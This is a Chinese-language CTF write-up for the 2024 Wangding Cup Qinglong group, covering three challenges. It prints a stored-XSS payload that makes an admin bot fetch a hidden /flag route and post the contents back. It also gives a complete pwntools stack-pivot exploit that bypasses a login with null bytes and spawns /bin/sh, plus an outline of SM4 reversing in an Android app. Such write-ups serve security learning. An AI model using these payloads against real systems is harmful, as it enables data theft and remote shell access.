---
title: 2024 第四届"网鼎杯"青龙组 writeup
contest: 2024 第四届网鼎杯 青龙组
year: 2024
difficulty: hard
vuln_type: [xss, ret2libc, reverse, block_cipher, web_unknown, pwn_unknown]
tags: [网鼎杯, 青龙组, 存储型XSS, admin-bot, fetch-exfil, 栈迁移, ret2libc, i386, SM4-国密, Android-NDK, native-check, fenjing]
attack_chain: ["WEB02: /content/hash 路由 + dirsearch 扫 /flag 路由，3 按钮（提交/刷新/更新）", "存储型 XSS：<script>fetch('/flag').then(r=>r.text()).then(d=>fetch('/content/...', {body:'content=123'+d}))</script>", "submit 提交触发 boss 审核 → XSS 弹到攻击者平台", "PWN02: login 绕过 admin\x00 + admin123\x00 → leak 栈地址", "vuln 栈溢出 → 栈迁移到栈地址 - 4 → ret_address → system('/bin/sh')", "REVERSE01: Android MainActivity → check 走 native 加密 → 解 apk 看 jni", "加密逻辑是 SM4 国密 → 找 key 解密 flag"]
key_payload: "<script>fetch('/flag').then(...).then(...)</script> + submit"
one_liner: 网鼎杯 2024 青龙组：XSS admin-bot exfil + 栈迁移 pwn + SM4 加密
lesson: 存储型 XSS 必须靠 admin 触发；栈迁移到泄露地址可绕小 buffer；SM4 是国产商用密码
quality: high
---

# 2024 第四届"网鼎杯"青龙组 writeup

原文 https://www.ctfiot.com/212654.html

## WEB02: 存储型 XSS + admin bot

**路由：**
- `/content/{hash}` — 用户提交的内容
- `/flag` — 隐藏路由（需 boss 权限）

**flag 路由响应：**
> 你是 boss 嘛？就想看其他无人机拟定执行任务？

**XSS payload:**
```html
<script>
  fetch('/flag').then(response => response.text()).then(data => {
    fetch('/content/2f9f1f36782a270b689d8c0f3e9e08df', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: "content=123" + data
    })
  })
</script>
```

**触发：**
- 提交 → boss 审核 → XSS 在 boss 浏览器执行
- boss 带 /flag 权限 → fetch('/flag') 拿内容
- 再 POST 回 attacker content 路由

## PWN02: 栈迁移
```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF('./pwn')
io = remote("0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn", 44958)
sh_address = 0x0804A038
ret_address = 0x08048674

io.recvuntil("Enter your username: ")
io.sendline(b'admin\x00')
io.recvuntil("Enter your password: ")
io.sendline(b'admin123\x00')

io.recvuntil(b"0x")
stac = int(io.recv(8), 16)
print(hex(stac))

payload = (p32(0x080485E6) + p32(0) + p32(sh_address)).ljust(80, b'\x00') + p32(stac-4) + p32(ret_address)

io.sendlineafter("plz input your msg:\n", payload)
io.interactive()
```

**攻击：**
- login 接受 `\x00` 截断
- 服务端输出栈地址
- 栈溢出 payload 长度不够 → 栈迁移到泄露地址
- system('/bin/sh')

## REVERSE01: Android SM4
- 找 MainActivity
- check 函数走 native 层
- 解 apk 看 jni 代码
- 加密逻辑 = **SM4 国密**
- 找 key + sm4 decrypt

## 教学价值
- **存储 XSS** 必须靠 admin bot 触发
- **fetch + 同源 POST** 是 exfil 标准
- **栈迁移** 解决 buffer 不足
- **SM4** 国产商用对称算法（128 bit 块，128 bit key）
- **网鼎杯** 是国内四大顶级赛事之一（与强网杯、护网杯、长城杯并列）

## 工具
- fenjing SSTI 工具
- 360 / 浏览器 hackbar
- pwntools
- jadx + Ghidra
- python sm4 库

## 关联
- 2024 网鼎杯同一批还有 #13 元的 meta（2024_网鼎杯_青龙&白虎.md）
